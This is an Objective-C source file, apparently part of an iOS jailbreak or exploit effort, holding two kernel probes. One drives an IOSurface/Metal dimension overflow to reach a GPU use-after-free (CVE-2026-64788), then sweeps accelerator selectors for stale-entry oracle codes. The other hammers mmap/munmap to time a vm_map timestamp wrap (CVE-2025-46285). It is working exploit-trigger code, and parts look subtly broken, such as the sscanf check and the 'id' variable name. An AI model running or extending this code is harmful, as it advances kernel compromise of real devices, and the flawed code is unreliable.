// ---------------------------------------------------------------------------
// NewProbes.m - two measurement probes for the only root-class applicable CVE
// and the only A14-tested public kernel PoC:
//
//  ModIOGPUUAFOracle  (CVE-2026-64788, PoC: ByteV0rtex, TESTED ON A14)
//    IOGPUDevice::create_resource_iosurface leaves a stale resource-table
//    entry when a packed dimension overflow (1x65535) takes the error path.
//    The PoC's oracle: set_resource_purgeable on the stale id returns
//    0xe00002be (stale entry processed) instead of 0xe00002c2 (not found).
//    This module: (1) drives the overflow path with IOSurfaces + Metal
//    textures, (2) finds the accelerator user client, (3) sweeps its
//    selectors and logs every return code - the measurement itself.  It does
//    NOT write anything and does NOT chain anything.
//
//  ModVmMapWrap  (CVE-2025-46285, the only root-class CVE)
//    xnu-12377.60.50 keeps struct vm_map.timestamp as a 32-bit version
//    counter (fixed to uint64_t in 26.2).  Every entry insert/remove in one
//    map increments it; a wrap lets a saved version collide with a re-read
//    version (TOCTOU).  This module measures the increment rate on THIS
//    device and projects the time to 2^32 on a single map - the precondition.
//    It churns one map (mmap/munmap pairs in the same range), logs the rate,
//    and is resumable across launches via the forensic file.
// ---------------------------------------------------------------------------
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <malloc/malloc.h>
#import <sys/mman.h>
#import <unistd.h>
#import <stdio.h>
#import <time.h>
#import <errno.h>
#import <string.h>

#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
// its types to this translation unit (measured on the CI toolchain: MTLDevice
// undeclared despite -framework Metal, and a hand-declared @protocol did not
// satisfy the compiler either).  So: plain id + the REAL selector names
// declared on NSObject (a category), and the class fetched at runtime.  The
// signatures match the runtime (note the lowercase "iosurface:", exactly as
// the CI compiler suggested).
extern id MTLCreateSystemDefaultDevice(void);

@interface NSObject (RSMetalNames)
+ (instancetype)texture2DDescriptorWithPixelFormat:(NSUInteger)pixelFormat
                                            width:(NSUInteger)width
                                           height:(NSUInteger)height
                                        mipmapped:(BOOL)mipmapped;
- (id)newTextureWithDescriptor:(id)descriptor
                     iosurface:(struct __IOSurface *)iosurface
                         plane:(NSUInteger)plane;
- (void)setUsage:(NSUInteger)usage;
@end

#define RS_MTL_PIXEL_BGRA8UNORM 80
#define RS_MTL_USAGE_SHADERREAD 1

// IOSurface: not importable from the plain iOS SDK
typedef struct __IOSurface *IOSurfaceRef_;
extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
#define kIOSurfaceWidth  CFSTR("IOSurfaceWidth")
#define kIOSurfaceHeight CFSTR("IOSurfaceHeight")
#define kIOSurfaceBytesPerElement CFSTR("IOSurfaceBytesPerElement")
#define kIOSurfaceBytesPerRow CFSTR("IOSurfaceBytesPerRow")

// ===========================================================================
// 1. CVE-2026-64788 oracle
// ===========================================================================
NSString *ModIOGPUUAFOracle(void) {
    AveLog(@"[gpu64788] === CVE-2026-64788 oracle: overflow IOSurface -> stale GPU resource entry ===");

    // ---- (1) find an accelerator / GPU user client ----
    const char *cls[] = { "AGXAcceleratorG13P", "AGXAcceleratorG17P",
                          "IOGPUDevice", "IOGPUFamily", NULL };
    io_connect_t gpu = 0;
    const char *who = NULL;
    for (int i = 0; cls[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
        if (!m) continue;
        io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (!d) continue;
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
        IOObjectRelease(d);
        AveLog(S(@"    class %-18s -> open %#x", cls[i], kr));
        if (kr == KERN_SUCCESS && c) {
            if (gpu) IOServiceClose(gpu);
            gpu = c; who = cls[i];
        }
    }
    if (!gpu) {
        AveLog(@"[gpu64788] no accelerator user client openable - the Metal path may still reach it via the GPU daemon");
    } else {
        AveLog(S(@"[gpu64788] accelerator client: %s", who));
    }

    // ---- (2) drive the overflow path: 1x65535 packed dimensions ----
    int made = 0;
    struct { uint32_t w, h; const char *tag; } O[] = {
        {1, 65535, "1x65535 (packed overflow)"},
        {65535, 1, "65535x1"},
        {1, 65536, "1x65536"},
        {8192, 8192, "8192x8192 (control)"},
    };
    for (unsigned i = 0; i < sizeof(O)/sizeof(O[0]); i++) {
        @autoreleasepool {
            NSDictionary *d = @{(id)kIOSurfaceWidth: @(O[i].w),
                                (id)kIOSurfaceHeight: @(O[i].h),
                                (id)kIOSurfaceBytesPerElement: @(4)};
            IOSurfaceRef_ s = IOSurfaceCreate((__bridge CFDictionaryRef)d);
            if (!s) { AveLog(S(@"    surface %-24s -> create FAILED", O[i].tag)); continue; }
            uint32_t id = IOSurfaceGetID(s);
            AveLog(S(@"    surface %-24s -> id=%u alloc=%zu", O[i].tag, id, IOSurfaceGetAllocSize(s)));
            made++;
            // The trigger: a Metal texture over the overflow surface is how the
            // public PoC reaches IOGPUDevice::create_resource_iosurface.
            @try {
                id dev = MTLCreateSystemDefaultDevice();
                if (dev) {
                    Class tdCls = objc_getClass("MTLTextureDescriptor");
                    id td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
                                                               width:O[i].w height:O[i].h mipmapped:NO];
                    [td setUsage:RS_MTL_USAGE_SHADERREAD];
                    id tex = [dev newTextureWithDescriptor:td
                                                 iosurface:(struct __IOSurface *)s
                                                     plane:0];
                    AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
                } else {
                    AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
                }
            } @catch (NSException *e) {
                AveLog(S(@"    texture %-24s -> threw %@", O[i].tag, e.reason));
            }
            CFRelease(s);
        }
    }
    AveLog(S(@"[gpu64788] %d/4 overflow surfaces created", made));

    // ---- (2b) AFTER the textures exist, retry the GPU classes with every
    // connection type (the GPU daemon sets up the accelerators on first use) ----
    if (!gpu) {
        for (int i = 0; cls[i]; i++) {
            for (uint32_t t = 0; t < 4; t++) {
                CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
                if (!m) continue;
                io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
                if (!d) continue;
                io_connect_t c = 0;
                kern_return_t kr = IOServiceOpen(d, mach_task_self(), t, &c);
                IOObjectRelease(d);
                if (kr == KERN_SUCCESS && c) {
                    AveLog(S(@"    class %-18s type %u -> OPEN", cls[i], t));
                    gpu = c; who = cls[i];
                    break;
                }
            }
            if (gpu) break;
        }
    }

    // ---- (3) sweep the accelerator selectors, log every code ----
    // The PoC's oracle codes: 0xe00002c2 (resource not found) vs
    // 0xe00002be (stale entry processed with our spray data).
    if (gpu) {
        AveLog(@"[gpu64788] selector sweep on the accelerator client:");
        for (uint32_t sel = 0; sel < 40; sel++) {
            uint64_t in[4] = {1, 0, 0, 0};
            uint64_t out[4] = {0, 0, 0, 0};
            size_t outSz = sizeof(out);
            kern_return_t r = IOConnectCallMethod(gpu, sel, in, 4, NULL, 0,
                                                  out, &outSz, NULL, NULL);
            if (r != (kern_return_t)0xe00002c2 && r != KERN_SUCCESS)
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            else
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            if (r == (kern_return_t)0xe00002c2 || r == (kern_return_t)0xe00002be)
                AveLog(S(@"    sel %-3u -> ORACLE CODE %#x (%s)", sel, r,
                         r == (kern_return_t)0xe00002be ? @"STALE ENTRY PROCESSED" : @"not found"));
        }
        IOServiceClose(gpu);
    }
    AveSetStatus(@"64788 oracle done - see the log");
    return @"64788 oracle: overflow surfaces + selector sweep logged (no writes, no chain)";
}

// ===========================================================================
// 2. CVE-2025-46285: vm_map timestamp wrap measurement
// ===========================================================================
static long long rs_vmwrap_read(void) {
    FILE *f = fopen([[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                         NSUserDomainMask, YES) firstObject]
                         stringByAppendingPathComponent:@"rs112477.log"] UTF8String], "r");
    if (!f) return 0;
    char line[256];
    long long v = 0;
    while (fgets(line, sizeof line, f))
        if (sscanf(line, "VMWRAP ops=%lld", &v) == 2) { /* keep last */ }
    fclose(f);
    return v;
}

static void rs_vmwrap_save(long long ops) {
    NSString *p = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                     NSUserDomainMask, YES) firstObject]
                     stringByAppendingPathComponent:@"rs112477.log"];
    FILE *f = fopen(p.UTF8String, "a");
    if (f) { fprintf(f, "VMWRAP ops=%lld\n", ops); fflush(f); fclose(f); }
}

NSString *ModVmMapWrap(void) {
    const long long kRuns = 60000000;      // mmap+munmap pairs per launch
    long long done0 = rs_vmwrap_read();
    AveLog(@"[vmwrap] === CVE-2025-46285: vm_map timestamp (32-bit version counter) wrap measurement ===");
    AveLog(S(@"[vmwrap] previous launches: %lld ops", done0));

    const size_t kPage = 4096;
    void *base = mmap(NULL, kPage * 4, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return @"vmwrap: mmap failed";

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    long long n = 0;
    int first_errno = 0;
    for (long long i = 0; i < kRuns; i++) {
        // each pair = one entry insert + one remove in the SAME map
        // (plain mmap/munmap: every insert/remove bumps map->timestamp)
        void *p = mmap(NULL, kPage, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED) {
            munmap(p, kPage);
            n += 2;
        } else if (!first_errno) {
            first_errno = errno;
            AveLog(S(@"[vmwrap] first mmap failure: errno=%d (%s)", errno, strerror(errno)));
        }
        if ((i & 0xFFFFFF) == 0xFFFFFF) {
            clock_gettime(CLOCK_MONOTONIC, &t1);
            double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
            AveLog(S(@"[vmwrap] %lld ops in %.1fs (%.2f Mops/s)", n, el, n / el / 1e6));
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    long long total = done0 + n;
    rs_vmwrap_save(total);
    double rate = n / el;
    double wrap_secs = 4294967296.0 / rate;
    munmap(base, kPage * 4);
    AveLog(S(@"[vmwrap] this run: %lld ops in %.1fs = %.2f Mops/s", n, el, rate / 1e6));
    AveLog(S(@"[vmwrap] total %lld ops; projected time to 2^32 on one map: %.0f s (%.1f min)",
             total, wrap_secs, wrap_secs / 60.0));
    AveSetStatus(@"vmwrap: rate measured, see the log");
    return S(@"vmwrap: %lld ops @ %.2f Mops/s; 2^32 wrap in %.1f min of churn",
              n, rate / 1e6, wrap_secs / 60.0);
}